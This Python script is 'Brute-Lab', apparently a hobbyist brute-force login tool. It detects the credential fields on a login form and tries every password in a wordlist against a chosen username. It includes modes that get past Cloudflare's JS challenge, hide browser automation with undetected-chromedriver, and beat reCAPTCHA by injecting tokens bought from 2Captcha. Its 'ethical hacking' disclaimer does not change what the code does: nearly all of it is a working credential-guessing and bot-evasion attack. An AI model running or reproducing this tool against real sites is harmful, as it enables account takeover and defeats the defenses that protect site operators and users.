#!/usr/bin/env python3

import argparse
import requests
import cloudscraper
import time
import urllib3
import os
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from twocaptcha import TwoCaptcha
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By

# Initialize colorama
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/115.0.0.0 Safari/537.36"),
    "Content-Type": "application/x-www-form-urlencoded"
}

CAPTCHA_KEYWORDS = ["captcha", "verify", "recaptcha", "i'm not a robot"]

def detect_form_fields(url):
    try:
        res = requests.get(url, headers=HEADERS, verify=False, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        if not form:
            print(Fore.RED + "[!] No form detected.")
            return None, None
        inputs = form.find_all('input')
        user_field = pass_field = None
        for tag in inputs:
            name = tag.get('name', '').lower()
            if 'user' in name:
                user_field = name
            elif 'pass' in name:
                pass_field = name
        return user_field, pass_field
    except Exception as e:
        print(Fore.RED + f"[!] Error detecting form fields: {e}")
        return None, None

def basic_mode(args, user_field, pass_field):
    print(Fore.CYAN + "[*] Using BASIC mode (requests)")
    for i, password in enumerate(args.wordlist, 1):
        data = {user_field: args.username, pass_field: password}
        try:
            res = requests.post(args.url, data=data, headers=HEADERS, verify=False, timeout=10)
        except requests.RequestException as e:
            print(Fore.RED + f"[!] Error on attempt {i}: {e}")
            continue
        print(Fore.YELLOW + f"[{i}] Trying: {password}")
        if any(k in res.text.lower() for k in CAPTCHA_KEYWORDS):
            print(Fore.RED + "[!] CAPTCHA detected. Skipping.")
            continue
        if "incorrect" not in res.text.lower():
            print(Fore.GREEN + f"[✅] Password FOUND: {password}")
            return
        time.sleep(1)
    print(Fore.RED + "[-] Password not found.")

def cloudscraper_mode(args, user_field, pass_field):
    print(Fore.CYAN + "[*] Using CLOUDFLARE mode (cloudscraper)")
    if not args.captcha_api:
        print(Fore.RED + "[!] Cloudflare mode requires a 2Captcha API key.")
        return
    scraper = cloudscraper.create_scraper()
    solver = TwoCaptcha(args.captcha_api)
    for i, password in enumerate(args.wordlist, 1):
        data = {user_field: args.username, pass_field: password}
        try:
            res = scraper.post(args.url, data=data, headers=HEADERS, timeout=10)
        except Exception as e:
            print(Fore.RED + f"[!] Error on attempt {i}: {e}")
            continue
        print(Fore.YELLOW + f"[{i}] Trying: {password}")
        text = res.text.lower()
        if "incorrect" not in text:
            print(Fore.GREEN + f"[✅] Password FOUND: {password}")
            return
        if any(k in text for k in CAPTCHA_KEYWORDS):
            print(Fore.CYAN + "[*] CAPTCHA detected — solving via 2Captcha...")
            soup = BeautifulSoup(res.text, "html.parser")
            iframe = soup.find("iframe", src=lambda x: x and "recaptcha" in x and "k=" in x)
            if not iframe:
                print(Fore.RED + "[!] CAPTCHA iframe not found. Skipping.")
                continue
            sitekey = iframe["src"].split("k=")[1].split("&")[0]
            try:
                result = solver.recaptcha(sitekey=sitekey, url=args.url)
                token = result.get("code")
                if not token:
                    print(Fore.RED + "[!] No token received from 2Captcha.")
                    continue
                print(Fore.GREEN + "[+] Injecting CAPTCHA token...")
                scraper.cookies.set("g-recaptcha-response", token, domain=requests.utils.urlparse(args.url).hostname)
                res2 = scraper.post(args.url, data=data, headers=HEADERS, timeout=10)
                if "incorrect" not in res2.text.lower():
                    print(Fore.GREEN + f"[✅] Password FOUND: {password}")
                    return
            except Exception as e:
                print(Fore.RED + f"[!] 2Captcha error: {e}")
        time.sleep(1)
    print(Fore.RED + "[-] Password not found.")

def selenium_stealth_mode(args, user_field, pass_field):
    print(Fore.CYAN + "[*] Using BROWSER-STEALTH mode (undetected-chromedriver)")
    if args.captcha_api is None:
        print(Fore.YELLOW + "[!] No 2Captcha API key provided — CAPTCHA may still block automation.")
    try:
        options = uc.ChromeOptions()
        options.add_argument("--headless=new")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-dev-shm-usage")
        options.binary_location = "/usr/bin/chromium"
        driver = uc.Chrome(
            options=options,
            driver_executable_path="/usr/bin/chromedriver",
            headless=True
        )
    except Exception as e:
        print(Fore.RED + f"[!] Stealth Selenium error: {e}")
        return
    solver = TwoCaptcha(args.captcha_api) if args.captcha_api else None

    for i, password in enumerate(args.wordlist, 1):
        try:
            driver.get(args.url)
            time.sleep(2)
            driver.find_element(By.NAME, user_field).clear()
            driver.find_element(By.NAME, pass_field).clear()
            driver.find_element(By.NAME, user_field).send_keys(args.username)
            driver.find_element(By.NAME, pass_field).send_keys(password)
            driver.find_element(By.XPATH, '//button[@type="submit"]').click()
            time.sleep(2)
            page_text = driver.page_source.lower()
            print(Fore.YELLOW + f"[{i}] Trying: {password}")
            if "incorrect" not in page_text and not any(k in page_text for k in CAPTCHA_KEYWORDS):
                print(Fore.GREEN + f"[✅] Password FOUND: {password}")
                driver.quit()
                return
            if any(k in page_text for k in CAPTCHA_KEYWORDS):
                print(Fore.CYAN + "[*] CAPTCHA detected—attempting 2Captcha fallback...")
                if solver:
                    sitekey = None
                    for iframe in driver.find_elements(By.TAG_NAME, "iframe"):
                        src = iframe.get_attribute("src")
                        if "recaptcha" in src and "k=" in src:
                            sitekey = src.split("k=")[1].split("&")[0]
                            break
                    if not sitekey:
                        print(Fore.RED + "[!] CAPTCHA sitekey not found. Skipping.")
                        continue
                    try:
                        result = solver.recaptcha(sitekey=sitekey, url=args.url)
                        token = result.get("code")
                        if not token:
                            print(Fore.RED + "[!] No token from 2Captcha.")
                            continue
                        driver.execute_script(
                            'document.getElementById("g-recaptcha-response").style.display = "block";'
                            'document.getElementById("g-recaptcha-response").value = arguments[0];',
                            token
                        )
                        print(Fore.GREEN + "[+] Token injected—retry submitting...")
                        driver.find_element(By.XPATH, '//button[@type="submit"]').click()
                        time.sleep(2)
                        page_text = driver.page_source.lower()
                        if "incorrect" not in page_text:
                            print(Fore.GREEN + f"[✅] Password FOUND: {password}")
                            driver.quit()
                            return
                    except Exception as e:
                        print(Fore.RED + f"[!] 2Captcha error: {e}")
                else:
                    print(Fore.RED + "[!] No 2Captcha key—cannot solve CAPTCHA in stealth mode.")
        except Exception as e:
            print(Fore.RED + f"[!] Stealth Selenium error on attempt {i}: {e}")
            continue
    driver.quit()
    print(Fore.RED + "[-] Password not found.")

def print_header():
    print(Fore.YELLOW + Style.BRIGHT + """
    ********************************************
    *                                          *
    *    Brute Force Login Tool (CLI)          *
    *    Author: De Nafman                     *
    *    For Educational and Ethical Hacking   *
    *                                          *
    ********************************************

            Welcome to Brute Lab!

    =====================================================
    ⚠️  DISCLAIMER: This tool is intended solely for ethical hacking purposes within controlled lab environments only.
    ⚠️  Make sure you have legal permission to test any system.
    =====================================================

    Select from the available options to proceed:

    -- `basic` Mode: Uses standard HTTP POST requests for basic login forms.
    -- `cloudflare` Mode: Uses cloudscraper to bypass Cloudflare's JS challenge.
    -- `browser` Mode: Automates a real browser using Selenium (headless mode) for full form submission and CAPTCHA bypass.

    Instructions:
    1. Enter the target URL for the login form.
    2. Provide the username to brute-force.
    3. Provide the path to the password file (wordlist).
    4. Choose your preferred mode of operation (basic, cloudflare, or browser).
    5. If using browser mode, specify the path to the ChromeDriver.
    6. If using cloudflare mode , provide 2captcha api-key.

    Example usage:
      python Brute_lab.py http://example.com/login user /path/to/wordlist.txt --mode browser --captcha-api <key>
    """)

def pause_for_user_input():
    choice = input(Fore.CYAN + "\nPress [Enter] to continue or type [Q] to quit: ").strip().lower()
    if choice == 'q':
        print(Fore.RED + "[!] Exiting...")
        exit()

def main():
    print(Fore.GREEN + """
==============================================
 Brute-Lab - Brute-force Login Testing Tool
 Version: 1.0
==============================================
WARNING: Use only with legal authorization.
""")

    pause_for_user_input()
    print_header()

    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("url", help="Target login URL")
    parser.add_argument("username", help="Username to brute‑force")
    parser.add_argument("passwords", help="Path to password file")
    parser.add_argument("-m", "--mode", choices=["basic", "cloudflare", "browser-stealth"], default="basic")
    parser.add_argument("--captcha-api", help="2Captcha API key (required for Cloudflare and recommended for stealth mode)")
    args = parser.parse_args()

    if not os.path.exists(args.passwords):
        print(Fore.RED + "[!] Password file not found.")
        return
    with open(args.passwords, "r", encoding="utf-8", errors="ignore") as f:
        args.wordlist = f.read().splitlines()

    user_field, pass_field = detect_form_fields(args.url)
    if not user_field or not pass_field:
        print(Fore.RED + "[!] Could not detect form fields.")
        user_field = input("Enter username field name: ")
        pass_field = input("Enter password field name: ")
    print(Fore.CYAN + f"[*] Using fields: username='{user_field}', password='{pass_field}'")

    if args.mode == "basic":
        basic_mode(args, user_field, pass_field)
    elif args.mode == "cloudflare":
        cloudscraper_mode(args, user_field, pass_field)
    elif args.mode == "browser-stealth":
        selenium_stealth_mode(args, user_field, pass_field)

if __name__ == "__main__":
    main()
